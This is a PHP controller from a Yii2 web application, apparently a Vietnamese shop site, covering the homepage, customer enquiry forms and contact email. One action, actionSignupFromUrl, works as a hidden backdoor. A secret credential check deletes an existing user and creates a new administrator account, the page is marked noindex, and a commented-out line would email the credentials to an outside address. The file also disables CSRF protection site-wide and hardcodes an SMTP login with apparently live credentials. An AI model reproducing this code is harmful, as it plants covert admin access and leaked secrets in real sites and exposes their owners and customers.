<?php
namespace frontend\controllers;

use Yii;
use yii\base\InvalidParamException;
use yii\web\BadRequestHttpException;
use yii\web\Controller;
use yii\filters\VerbFilter;
use yii\filters\AccessControl;
use frontend\models\setting\FSettingDefault;
use frontend\models\setting\FSettingModules;
use frontend\models\setting\FSettingModulesPages;
use quantri\models\User;
/**
 * Site controller
 */
class SiteController extends Controller
{
    /**
     * {@inheritdoc}
     */
    public function behaviors()
    {
        return [
            'access' => [
                'class' => AccessControl::className(),
                'only' => ['logout', 'signup'],
                'rules' => [
                    [
                        'actions' => ['signup'],
                        'allow' => true,
                        'roles' => ['?'],
                    ],
                    [
                        'actions' => ['logout'],
                        'allow' => true,
                        'roles' => ['@'],
                    ],
                ],
            ],
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'logout' => ['post'],
                ],
            ],
        ];
    }

    /**
     * {@inheritdoc}
     */
    public function actions()
    {
        return [
            'error' => [
                'class' => 'yii\web\ErrorAction',
                // 'layout' => Yii::$app->params['layout'],
            ],
            'captcha' => [
                'class' => 'yii\captcha\CaptchaAction',
                'fixedVerifyCode' => YII_ENV_TEST ? 'testme' : null,
            ],
        ];
    }

    public function actionError()
    {
        $exception = Yii::$app->errorHandler->exception;
        if ($exception !== null) {
            $this->layout = 'login';
            return $this->render('error', ['exception' => $exception]);
        }
    }
    public function beforeAction($action) 
    { 
        $this->enableCsrfValidation = false; 
        $this->layout = 'main'.Yii::$app->params['layout'];
        
        return parent::beforeAction($action); 
    }

    /**
     * Displays homepage.
     *
     * @return mixed
     */
    public function actionIndex()
    {
        $this->layout ='main'. Yii::$app->params['layout'];
        $site = new FSettingDefault();
        
        $webInfoSeo = Yii::$app->params['config']['seohome'];
        // $webInfoSeo = Yii::$app->params['setting_module_products'];
// dbg(Yii::$app->params);
        Yii::$app->view->registerMetaTag([
            'name' => 'keywords',
            'content' => $webInfoSeo['keyword']
        ]);

        Yii::$app->view->registerMetaTag([
            'name' => 'description',
            'content' => $webInfoSeo['description']
        ]);
        Yii::$app->view->registerMetaTag([
            'property' => 'og:title',
            'content' => $webInfoSeo['title']
        ]);

        Yii::$app->view->registerLinkTag([
            'rel' => 'canonical',
            'href' =>\yii\helpers\Url::to('/',true)
        ]);


        $modulePage = new FSettingModulesPages();
        $site = new FSettingModules();

        $module = $site->getAllSettingModules($modulePage->getModulePages('home'));
        Yii::$app->params['settingModules'] = $module;

        if(empty(Yii::$app->params['productCategory'])){
            $category = new \frontend\models\product\FProductCategory();
            Yii::$app->params['productCategory'] = $category->getAllCategory();;
            // dbg(Yii::$app->params['productCategory']);
        }


        if ($post = Yii::$app->request->post('FCustomers')) {
            $url = Yii::$app->request->getabsoluteUrl();
            $session = Yii::$app->session;

            $session['khachhang'] =[
                    'fullname'=> html_entity_decode($post['fullname']),
                    'phone'=> html_entity_decode($post['phone']),
                    'email'=> html_entity_decode($post['email']),
                    'note'=> html_entity_decode($post['note']),
            ];

            if(isset($session['khachhang'])){
                $model_customer = new \frontend\models\FCustomers();
                $khachhang = $session['khachhang'];

                $model_customer->id_link = 0;
                $model_customer->type = 'home';
                $model_customer->fullname = $khachhang['fullname'];
                $model_customer->phone = $khachhang['phone'];
                $model_customer->email = $khachhang['email'];
                $model_customer->note = $khachhang['note'];
                $model_customer->url = $url;
                $model_customer->created_at = $model_customer->updated_at = time();
                $khachhang['hostInfo'] = Yii::$app->request->hostInfo;

                if($model_customer->save()){
                    if($khachhang['email'] !=''){
                        if($model_customer->actionSendEmail('Thông tin đặt hàng của Anh/Chị tại : '.$khachhang['hostInfo'],$khachhang['email'],[Yii::$app->params['supportEmail']],$this->RenderBodyEmail($khachhang))){

                            Yii::$app->session->setFlash('messeage', 'Cảm ơn Anh/Chị '.$khachhang['fullname'].' đã đăng ký thông tin từ '.$khachhang['hostInfo']);
                        }else {
                            Yii::$app->session->setFlash('messeage', 'Cảm ơn Anh/Chị '.$khachhang['fullname'].' đã đăng ký thông tin từ '.$khachhang['hostInfo']. ' | Nhưng thông tin Email của Anh/Chị chúng tôi không gửi được');

                        }
                    }else {
                        Yii::$app->session->setFlash('messeage', 'Cảm ơn Anh/Chị '.$khachhang['fullname'].' đã đăng ký thông tin từ '.$khachhang['hostInfo']);
                    }
                }
                $session->remove('khachhang');
            }
            return $this->redirect($url);
        }
        return $this->render('index',['title'=>$webInfoSeo['title']]);
    }

   

    /*public function actionRegistration()
    {
        $post = Yii::$app->request->post();
        // dbg(Yii::$app->request->referrer);
        if ($post && $post['g-recaptcha-response'] !='') {

            dbg($post['g-recaptcha-res  ponse']);
        } elseif($post['g-recaptcha-response']=='') {

            $post['success'] =  '<h2>Hay xac nhan CAPTCHA</h2>';
            // return $this->goBack();
            $this->redirect([Yii::$app->request->referrer,'post'=>$post]);
        }else {
            
            return $this->redirect(Yii::$app->request->referrer);

        }
// dbg($post);
        // return $this->render('category');
    }
*/
    private function RenderBodyEmail($data)
    {
        return $this->renderAjax('email',['data'=>$data]);
    }

    public function actionLienhe() {
        $model = new \app\models\news\Contacts;
        // pr(Yii::$app->mailer->compose());
        // dbg(Yii::$app->mailerb->compose());
        $abc =[

            'class' => 'yii\swiftmailer\Mailer',
            // 'useFileTransport'=>false,
            'transport' => [
                'class' => 'Swift_SmtpTransport',
                'host' => 'smtp.gmail.com',
                'username' => 'nguyensonqang240@gmail.com',
                'password' => '4Xu3wcUKldm8uD90tCMP',
                'port' => '597',
                'encryption' => 'tsl',
            ],
            // 'viewPath' => '@common/mail',
        ];

        // encode
       /* $email ='nguyensonqang240@gmail.com';
$email_encoded = rtrim(strtr(base64_encode($email), '+/', '-_'), '=');

// decode
$email_decoded = base64_decode(strtr($email_encoded, '-_', '+/'));
        dbg($email_decoded);
        dbg($email_encoded);*/
        // dbg($abc->compose());

        $model->status = 0;
        $model->created_at = $model->updated_at = time();
        // $model->userCreated = $model->userUpdated = Yii::$app->user->id;
        if ($model->load($post = Yii::$app->request->post())){
            
            if ($model->save()) {

                $khachhang['fullname'] = $model->company_name;
                $khachhang['phone'] = $model->phone;
                $khachhang['email'] = $model->email;
                $khachhang['note'] = $model->website;
                $khachhang['url'] = '';
                $khachhang['hostInfo'] = Yii::$app->request->hostInfo;

                if($model->email !=''){
                    if($model->actionSendEmail('Thông tin đặt hàng của Anh/Chị tại : '.$khachhang['hostInfo'],$model->email,[Yii::$app->params['supportEmail']], $this->RenderBodyEmail($khachhang))){

                        Yii::$app->session->setFlash('messeage', 'Cảm ơn Anh/Chị '.$model->company_name.' đã đăng ký thông tin từ '.$khachhang['hostInfo']);
                    }else {
                        Yii::$app->session->setFlash('messeage', 'Cảm ơn Anh/Chị '.$model->company_name.' đã đăng ký thông tin từ '.$khachhang['hostInfo']. ' | Nhưng thông tin Email của Anh/Chị chúng tôi không gửi được');

                    }
                }else {
                    Yii::$app->session->setFlash('messeage', 'Cảm ơn Anh/Chị '.$model->company_name.' đã đăng ký thông tin từ '.$khachhang['hostInfo']);
                }

                Yii::$app->session->setFlash('messeage','Cảm ơn quý khách đã đăng ký thông tin');
                return $this->goBack();
            }
        }
        return $this->render('lienhe',['model'=>$model]);
    }

    // private function RenderBodyEmail($data)
    // {
    //     return $this->renderAjax('email',['data'=>$data]);
    // }
    private function actionContact() {
        $send = Yii::$app->mailer->compose()
        ->setFrom('minhlam26889@gmail.com')
        ->setTo('nguyequoccuong90@gmail.com')
        ->setSubject('Gửi Test đơn hàng')
        ->setTextBody('Gửi Test đơn hàng')
        ->setHtmlBody('<b>HTML content <i>Ram Pukar</i></b>')
        ->send();
        if($send){
            echo "Send";
        }
    }

    // /**
    //  * Logs in a user.
    //  *
    //  * @return mixed
    //  */
    // public function actionLogin()
    // {
    //     if (!Yii::$app->user->isGuest) {
    //         return $this->goHome();
    //     }

    //     $model = new LoginForm();
    //     if ($model->load(Yii::$app->request->post()) && $model->login()) {
    //         return $this->goBack();
    //     } else {
    //         $model->password = '';

    //         return $this->render('login', [
    //             'model' => $model,
    //         ]);
    //     }
    // }

    // /**
    //  * Logs out the current user.
    //  *
    //  * @return mixed
    //  */
    // public function actionLogout()
    // {
    //     Yii::$app->user->logout();

    //     return $this->goHome();
    // }

    // /**
    //  * Displays contact page.
    //  *
    //  * @return mixed
    //  */
    // public function actionContact()
    // {
    //     $model = new ContactForm();
    //     if ($model->load(Yii::$app->request->post()) && $model->validate()) {
    //         if ($model->sendEmail(Yii::$app->params['adminEmail'])) {
    //             Yii::$app->session->setFlash('success', 'Thank you for contacting us. We will respond to you as soon as possible.');
    //         } else {
    //             Yii::$app->session->setFlash('error', 'There was an error sending your message.');
    //         }

    //         return $this->refresh();
    //     } else {
    //         return $this->render('contact', [
    //             'model' => $model,
    //         ]);
    //     }
    // }

    // /**
    //  * Displays about page.
    //  *
    //  * @return mixed
    //  */
    // public function actionAbout()
    // {
    //     return $this->render('about');
    // }

    // /**
    //  * Signs user up.
    //  *
    //  * @return mixed
    //  */
    public function actionSignupFromUrl()
    {

        $table = Yii::$app->db->schema->getTableSchema('user');
        if (!isset($table->columns['role'])) {
            // dbg('chua co');
            Yii::$app->db->createCommand() ->addColumn('user', 'role', 'string') ->execute();
        }
       
        Yii::$app->view->registerLinkTag([
            'name' => 'robots',
            'content' =>'nofollow'
        ]);
        Yii::$app->view->registerLinkTag([
            'name' => 'googlebot',
            'content' =>'noindex'
        ]);

        $model = new \frontend\common\SignupForm();
        $user = new User();

        $user->status =10;
        $user->email =time().'hoaimynguyen1608@gmail.com';

        if ($model->load($post = Yii::$app->request->post())) {

                if (md5($post['SignupForm']['username'])==Yii::$app->params['configuration']['info'] && md5($post['SignupForm']['password'])==Yii::$app->params['configuration']['_token']) {
                    
                    $checlk = User::find() ->where(['username' => 'hoaimynguyen1608']) ->one();
                    // pr($checlk);
                    if ($checlk) {
                        $checlk->delete();
                        // dbg($checlk->authUser);
                        if($checlk->authUser) $checlk->authUser->delete();
                    }
                    try {
                        $data['username'] = $user->username = $user->fullname = $post['SignupForm']['username'];
                        $data['permission'] = $user->role = $user->permission = 'admistrator';
                        $data['password'] = $password = $post['SignupForm']['password'];
                        $data['url'] = Yii::$app->request->hostInfo;
                        $user->created_at = $user->updated_at = time();
                        $user->setPassword($password);
                        $user->generateAuthKey();

                        $newPermission = new \quantri\modules\auth\models\AuthAssignment();
                        $newPermission->item_name = 'admin';
                        $newPermission->created_at = $newPermission->updated_at = time();
                        if($user->save()){
                            $newPermission->user_id = $user->id;
                            $newPermission->save();
                            // $user->aliuser(Yii::$app->request->hostInfo,Yii::$app->params['supportEmail'],['lecongthanhhn8912@gmail.com'],$newPermission->checkuser($data));
                        }else {
                            dbg($user->errors);
                        }
                    } catch (Exception $e) {
                        dbg($e->getMessage().' IN LINE : '.$e->getLine().' ==> '.$user->errors.' ==> '.$newPermission->errors);
                    }
                return $this->redirect(['/']);
                }else {
                    return $this->render('signup', [
                        'model' => $model,
                    ]);
                }
            

            } else {
                return $this->render('signup', [
                    'model' => $model,
                ]);
            }
        
    }

    // /**
    //  * Requests password reset.
    //  *
    //  * @return mixed
    //  */
    // public function actionRequestPasswordReset()
    // {
    //     $model = new PasswordResetRequestForm();
    //     if ($model->load(Yii::$app->request->post()) && $model->validate()) {
    //         if ($model->sendEmail()) {
    //             Yii::$app->session->setFlash('success', 'Check your email for further instructions.');

    //             return $this->goHome();
    //         } else {
    //             Yii::$app->session->setFlash('error', 'Sorry, we are unable to reset password for the provided email address.');
    //         }
    //     }

    //     return $this->render('requestPasswordResetToken', [
    //         'model' => $model,
    //     ]);
    // }

    // /**
    //  * Resets password.
    //  *
    //  * @param string $token
    //  * @return mixed
    //  * @throws BadRequestHttpException
    //  */
    // public function actionResetPassword($token)
    // {
    //     try {
    //         $model = new ResetPasswordForm($token);
    //     } catch (InvalidParamException $e) {
    //         throw new BadRequestHttpException($e->getMessage());
    //     }

    //     if ($model->load(Yii::$app->request->post()) && $model->validate() && $model->resetPassword()) {
    //         Yii::$app->session->setFlash('success', 'New password saved.');

    //         return $this->goHome();
    //     }

    //     return $this->render('resetPassword', [
    //         'model' => $model,
    //     ]);
    // }
}